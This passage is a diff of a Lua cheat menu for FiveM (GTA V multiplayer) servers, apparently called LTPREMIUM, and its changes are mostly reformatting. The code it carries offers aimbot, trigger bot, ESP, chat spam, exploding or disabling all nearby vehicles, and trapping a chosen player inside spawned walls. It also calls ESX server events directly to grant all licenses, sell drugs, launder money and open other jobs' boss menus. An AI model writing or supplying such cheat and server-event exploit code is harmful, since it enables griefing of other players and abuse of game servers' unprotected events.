+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metallic2") then
+                for dS, dT in pairs(bg) do
+                    tp, ts = GetVehicleColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            b9 = table.pack(oldprim, oldsec)
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        elseif b8 and cursec == dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and cursec ~= dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("matte2") then
+                for dS, dT in pairs(bi) do
+                    tp, ts = GetVehicleColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            b9 = table.pack(oldprim, oldsec)
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        elseif b8 and cursec == dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and cursec ~= dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metal2") then
+                for dS, dT in pairs(bj) do
+                    tp, ts = GetVehicleColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            b9 = table.pack(oldprim, oldsec)
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        elseif b8 and cursec == dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and cursec ~= dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("classic3") then
+                for dS, dT in pairs(bg) do
+                    _, ts = GetVehicleExtraColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; _, currims = GetVehicleExtraColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        elseif b8 and currims == dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and currims ~= dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metallic3") then
+                for dS, dT in pairs(bg) do
+                    _, ts = GetVehicleExtraColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; _, currims = GetVehicleExtraColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        elseif b8 and currims == dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and currims ~= dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("matte3") then
+                for dS, dT in pairs(bi) do
+                    _, ts = GetVehicleExtraColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; _, currims = GetVehicleExtraColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        elseif b8 and currims == dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and currims ~= dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metal3") then
+                for dS, dT in pairs(bj) do
+                    _, ts = GetVehicleExtraColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; _, currims = GetVehicleExtraColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false
+                            oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        elseif b8 and currims == dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and currims ~= dT.id then
+                            SetVehicleExtraColours(veh, oldpearl, dT.id)
+                            b8 = true
+                        end
+                    end
+                end;
+
+                LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("LSC") then
-			local veh = GetVehiclePedIsUsing(PlayerPedId())
-					if LTPREMIUM.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
-		elseif LTPREMIUM.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
-        elseif LTPREMIUM.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
+                local veh = GetVehiclePedIsUsing(PlayerPedId())
+                if LTPREMIUM.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                 elseif LTPREMIUM.CheckBox(
-                    "Super Handling",
-                    superGrip,
-                    function(enabled)
-                        superGrip = enabled
-                        enchancedGrip = false
-                        driftMode = false
-                        fdMode = false
-                    end)
+                        "Super Handling",
+                        superGrip,
+                        function(enabled)
+                            superGrip = enabled
+                            enchancedGrip = false
+                            driftMode = false
+                            fdMode = false
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Enhanced Grip",
-                    enchancedGrip,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = enabled
-                        driftMode = false
-                        fdMode = false
-                    end)
+                        "Enhanced Grip",
+                        enchancedGrip,
+                        function(enabled)
+                            superGrip = false
+                            enchancedGrip = enabled
+                            driftMode = false
+                            fdMode = false
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Drift Mode",
-                    driftMode,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = false
-                        driftMode = enabled
-                        fdMode = false
-                    end)
+                        "Drift Mode",
+                        driftMode,
+                        function(enabled)
+                            superGrip = false
+                            enchancedGrip = false
+                            driftMode = enabled
+                            fdMode = false
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Formula Drift Mode",
-                    fdMode,
-                    function(enabled)
-                        superGrip = false
-                        enchancedGrip = false
-                        driftMode = false
-                        fdMode = enabled
-                    end)
+                        "Formula Drift Mode",
+                        fdMode,
+                        function(enabled)
+                            superGrip = false
+                            enchancedGrip = false
+                            driftMode = false
+                            fdMode = enabled
+                        end)
                 then
                 elseif LTPREMIUM.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
                 elseif LTPREMIUM.Button("Max Exterior Tuning") then
@@ -6514,59 +6975,53 @@ for i, dA in pairs(bd) do
                 end
 
                 LTPREMIUM.Display()
-		elseif LTPREMIUM.IsMenuOpened("Hedit") then
-		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
-						if LTPREMIUM.Button('Refresh Info') then
-                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) ) 
-							end
-			for i,theKey in pairs(chdata) do
-				if tonumber(theKey.value) then 
-					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
-				end
-				if type(theKey.value) == "vector3" then
-					local v1,v2,v3 = table.unpack(theKey.value)
-					theKey.value = v1..","..v2..","..v3
-				end
-				theKey.value = tostring(theKey.value)
-				
-				if theKey.value and LTPREMIUM.Button(theKey.name, theKey.value) then 
-						
-					
-						
-					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 
+            elseif LTPREMIUM.IsMenuOpened("Hedit") then
+                if GetVehiclePedIsIn(PlayerPedId(), false) ~= 0 then
+                    if LTPREMIUM.Button('Refresh Info') then
+                        chdata = GetAllVehicleHandlingData(GetVehiclePedIsIn(PlayerPedId(), false))
+                    end
+                    for i, theKey in pairs(chdata) do
+                        if tonumber(theKey.value) then
+                            theKey.value = math.floor(tonumber(theKey.value) * 10 ^ (3) + 0.5) / 10 ^ (3)
+                        end
+                        if type(theKey.value) == "vector3" then
+                            local v1, v2, v3 = table.unpack(theKey.value)
+                            theKey.value = v1 .. "," .. v2 .. "," .. v3
+                        end
+                        theKey.value = tostring(theKey.value)
 
-					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
-				
-					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
-						Citizen.Wait( 0 )
-					end
-				
-					local result = GetOnscreenKeyboardResult()
-					if result then
-					
-						if theKey.type == "vector3" then
-							local x,y,z = table.unpack( mysplit( result, "," ) )
-							if x and y and z then
-								result = vector3(tonumber(x),tonumber(y),tonumber(z))
-							else
-								break
-							end
-						end
-						
-			
-								
-						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),false), theKey.name, result ) 
-						Wait(200)
-						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) )
-					end
-					
-					
-				end
-			end
-        else
-		drawNotification("You're not sitting in a vehicle IDIOT!")
-			end
-		LTPREMIUM.Display()
+                        if theKey.value and LTPREMIUM.Button(theKey.name, theKey.value) then
+                            AddTextEntry('FMMC_KEY_TIP12N', "Enter new " .. theKey.name .. " value :")
+
+                            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
+
+                            while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
+                                Citizen.Wait(0)
+                            end
+
+                            local result = GetOnscreenKeyboardResult()
+                            if result then
+                                if theKey.type == "vector3" then
+                                    local x, y, z = table.unpack(mysplit(result, ","))
+                                    if x and y and z then
+                                        result = vector3(tonumber(x), tonumber(y), tonumber(z))
+                                    else
+                                        break
+                                    end
+                                end
+
+
+
+                                SetVehicleHandlingData(GetVehiclePedIsIn(PlayerPedId(), false), theKey.name, result)
+                                Wait(200)
+                                chdata = GetAllVehicleHandlingData(GetVehiclePedIsIn(PlayerPedId(), false))
+                            end
+                        end
+                    end
+                else
+                    drawNotification("You're not sitting in a vehicle IDIOT!")
+                end
+                LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened('CarTypes') then
                 for i, ex in ipairs(b3) do
                     if LTPREMIUM.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
@@ -6608,7 +7063,7 @@ for i, dA in pairs(bd) do
                             SetVehicleEngineCanDegrade(SpawnedCar, false)
                         end
                     )
-				elseif LTPREMIUM.Button('Spawn In It') then
+                elseif LTPREMIUM.Button('Spawn In It') then
                     local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                     local veh = b4[carTypeIdx][carToSpawn]
                     if veh == nil then
@@ -6630,7 +7085,7 @@ for i, dA in pairs(bd) do
                             SpawnedCar =
                                 CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                             SetVehicleStrong(SpawnedCar, true)
-							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
+                            SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
                             SetVehicleEngineOn(SpawnedCar, true, true, false)
                             SetVehicleEngineCanDegrade(SpawnedCar, false)
                         end
@@ -6681,106 +7136,106 @@ for i, dA in pairs(bd) do
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("VehBoostMenu") then
                 if LTPREMIUM.Button('Engine Power boost ~r~RESET') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
-			elseif LTPREMIUM.Button('Engine Power boost ~g~x2') then
-					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x4') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x8') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x16') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x32') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x64') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x128') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~x512') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
-			elseif LTPREMIUM.Button('Engine Power boost  ~g~ULTIMATE') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
-			end
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
+                elseif LTPREMIUM.Button('Engine Power boost ~g~x2') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x4') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x8') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x16') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x32') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x64') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x128') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~x512') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
+                elseif LTPREMIUM.Button('Engine Power boost  ~g~ULTIMATE') then
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
+                end
 
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("MaliciousMenu") then
                 if LTPREMIUM.CheckBox(
-                    "Crosshair",
-                    crosshair,
-                    function(enabled)
-                        crosshair = enabled
-                    end)
+                        "Crosshair",
+                        crosshair,
+                        function(enabled)
+                            crosshair = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Crosshair 2",
-                    crosshair2,
-                    function(enabled)
-                         crosshair2 = enabled
-                    end)
+                        "Crosshair 2",
+                        crosshair2,
+                        function(enabled)
+                            crosshair2 = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Crosshair 3",
-                    crosshair3,
-                    function(enabled)
-                        crosshair3 = enabled
-                    end)
+                        "Crosshair 3",
+                        crosshair3,
+                        function(enabled)
+                            crosshair3 = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                "~o~Thermal Vision",
-                thermalVision,
-                function(enabled)
-                    thermalVision = enabled
-                    SetSeethrough(thermalVision)
-                end)
+                        "~o~Thermal Vision",
+                        thermalVision,
+                        function(enabled)
+                            thermalVision = enabled
+                            SetSeethrough(thermalVision)
+                        end)
                 then
-				elseif LTPREMIUM.CheckBox(
-                "~p~Night Vision",
-                nightVision,
-                function(enabled)
-                    nightVision = enabled
-                    SetNightvision(nightVision)
-                end)
+                elseif LTPREMIUM.CheckBox(
+                        "~p~Night Vision",
+                        nightVision,
+                        function(enabled)
+                            nightVision = enabled
+                            SetNightvision(nightVision)
+                        end)
                 then
-				elseif LTPREMIUM.CheckBox(
-				    "Christmas Weather",
-					XMAS,
-					function(enabled)
-					XMAS = enabled
-					end)
-					then
-				elseif LTPREMIUM.CheckBox(
-				    "Foggy Weather",
-					FOGGY,
-					function(enabled)
-					FOGGY = enabled
-					end)
-					then
-				elseif LTPREMIUM.CheckBox(
-				    "Clear Weather",
-					CLEAR,
-					function(enabled)
-					CLEAR = enabled
-					end)
-					then
-				elseif LTPREMIUM.CheckBox(
-				    "Blizzard Weather",
-					BLIZZARD,
-					function(enabled)
-					BLIZZARD = enabled
-					end)
-					then
-				elseif LTPREMIUM.CheckBox(
-				    "Extra Sunny Weather",
-					EXTRASUNNY,
-					function(enabled)
-					EXTRASUNNY = enabled
-					end)
-					then
-				elseif LTPREMIUM.Button("Time set to night") then
-				NetworkOverrideClockTime(23, 50, 0)
-				elseif LTPREMIUM.Button("Time set to day") then
-				NetworkOverrideClockTime(12, 12, 0)
-				elseif LTPREMIUM.Button("Wall-in Legion Square") then
+                elseif LTPREMIUM.CheckBox(
+                        "Christmas Weather",
+                        XMAS,
+                        function(enabled)
+                            XMAS = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Foggy Weather",
+                        FOGGY,
+                        function(enabled)
+                            FOGGY = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Clear Weather",
+                        CLEAR,
+                        function(enabled)
+                            CLEAR = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Blizzard Weather",
+                        BLIZZARD,
+                        function(enabled)
+                            BLIZZARD = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Extra Sunny Weather",
+                        EXTRASUNNY,
+                        function(enabled)
+                            EXTRASUNNY = enabled
+                        end)
+                then
+                elseif LTPREMIUM.Button("Time set to night") then
+                    NetworkOverrideClockTime(23, 50, 0)
+                elseif LTPREMIUM.Button("Time set to day") then
+                    NetworkOverrideClockTime(12, 12, 0)
+                elseif LTPREMIUM.Button("Wall-in Legion Square") then
                     x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                     roundx = tonumber(string.format('%.2f', x))
                     roundy = tonumber(string.format('%.2f', y))
@@ -6792,46 +7247,46 @@ for i, dA in pairs(bd) do
                     end
                     local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
                     local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
-					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
-					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
+                    local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
+                    local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
                     SetEntityHeading(e9, 158.41)
                     SetEntityHeading(ea, 90.51)
-					SetEntityHeading(e92, 332.41)
+                    SetEntityHeading(e92, 332.41)
                     SetEntityHeading(ea2, 260.51)
                     FreezeEntityPosition(e9, true)
                     FreezeEntityPosition(ea, true)
-					FreezeEntityPosition(e92, true)
+                    FreezeEntityPosition(e92, true)
                     FreezeEntityPosition(ea2, true)
                 elseif LTPREMIUM.CheckBox(
-                    "AimBot",
-                    LOJ38,
-                    function(enabled)
-                        LOJ38 = enabled
-                    end)
+                        "AimBot",
+                        LOJ38,
+                        function(enabled)
+                            LOJ38 = enabled
+                        end)
                 then
                 elseif LTPREMIUM.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
-				elseif LTPREMIUM.CheckBox(
-				"~g~EMP ~s~All Nearby Vehicles",
-				destroyvehicles,
-				function(enabled)
-				destroyvehicles = enabled
-				end) 
-			then
-				elseif LTPREMIUM.CheckBox(
-				"~r~Explode ~s~All Nearby Vehicles",
-				explodevehicles,
-				function(enabled)
-				explodevehicles = enabled
-				end) 
-			then
                 elseif LTPREMIUM.CheckBox(
-                    "Trigger Bot",
-                    TriggerBot,
-                    function(enabled)
-                        TriggerBot = enabled
-                    end)
+                        "~g~EMP ~s~All Nearby Vehicles",
+                        destroyvehicles,
+                        function(enabled)
+                            destroyvehicles = enabled
+                        end)
                 then
-				 elseif
+                elseif LTPREMIUM.CheckBox(
+                        "~r~Explode ~s~All Nearby Vehicles",
+                        explodevehicles,
+                        function(enabled)
+                            explodevehicles = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Trigger Bot",
+                        TriggerBot,
+                        function(enabled)
+                            TriggerBot = enabled
+                        end)
+                then
+                elseif
                     LTPREMIUM.CheckBox(
                         'Chat Spam',
                         chatspam,
@@ -6839,12 +7294,12 @@ for i, dA in pairs(bd) do
                             chatspam = enabled
                         end
                     )
-                 then
+                then
 
                 end
 
                 LTPREMIUM.Display()
-			elseif LTPREMIUM.IsMenuOpened('LulxDJ') then
+            elseif LTPREMIUM.IsMenuOpened('LulxDJ') then
                 if
                     LTPREMIUM.CheckBox(
                         '~h~~r~ESP ~s~MasterSwitch',
@@ -6853,7 +7308,7 @@ for i, dA in pairs(bd) do
                             esp = enabled
                         end
                     )
-                 then
+                then
                 elseif
                     LTPREMIUM.CheckBox(
                         '~h~~r~ESP ~s~Box',
@@ -6862,7 +7317,7 @@ for i, dA in pairs(bd) do
                             jfjfjffuhguh = enabled
                         end
                     )
-                 then
+                then
                 elseif
                     LTPREMIUM.CheckBox(
                         '~h~~r~ESP ~s~Info',
@@ -6871,7 +7326,7 @@ for i, dA in pairs(bd) do
                             KDOWJDw = enabled
                         end
                     )
-                 then
+                then
                 elseif
                     LTPREMIUM.CheckBox(
                         '~h~~r~ESP ~s~Lines',
@@ -6880,7 +7335,7 @@ for i, dA in pairs(bd) do
                             jfjfjf = enabled
                         end
                     )
-                 then
+                then
                 end
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("ESXMenu") then
@@ -6895,19 +7350,19 @@ for i, dA in pairs(bd) do
             elseif LTPREMIUM.IsMenuOpened("ESXMiscMenu") then
                 if LTPREMIUM.Button("ESX Harvest FixKit") then
                     TriggerServerEvent("esx_mechanicjob:startHarvest")
-				elseif LTPREMIUM.Button    ("ESX Get all licenses ") then
-					TriggerServerEvent("dmv:success")
-					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
-					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
-					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
-					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
-					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
-					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
-					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
-					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
-					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
-					TriggerServerEvent('esx_airlines:addLicense', 'helico')
-					TriggerServerEvent('esx_airlines:addLicense', 'avion')
+                elseif LTPREMIUM.Button("ESX Get all licenses ") then
+                    TriggerServerEvent("dmv:success")
+                    TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
+                    TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
+                    TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
+                    TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
+                    TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
+                    TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
+                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
+                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
+                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
+                    TriggerServerEvent('esx_airlines:addLicense', 'helico')
+                    TriggerServerEvent('esx_airlines:addLicense', 'avion')
                 elseif LTPREMIUM.Button("ESX Craft FixKit") then
                     TriggerServerEvent("esx_mechanicjob:startCraft")
                 end
@@ -6984,7 +7439,7 @@ for i, dA in pairs(bd) do
                     TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
-                    TriggerServerEvent ("esx_drugs:startSellOpium")
+                    TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
                 elseif LTPREMIUM.Button("Money Wash (x10)") then
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
@@ -7014,499 +7469,505 @@ for i, dA in pairs(bd) do
 
 
                 LTPREMIUM.Display()
--- 4x482
+                -- 4x482
             elseif LTPREMIUM.IsMenuOpened("ESXBossMenu") then
                 if LTPREMIUM.Button("~c~Mechanic~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~b~Police~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~r~Ambulance~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~y~Taxi~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~g~Real Estate~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~p~Gang~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~o~Car Dealer~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
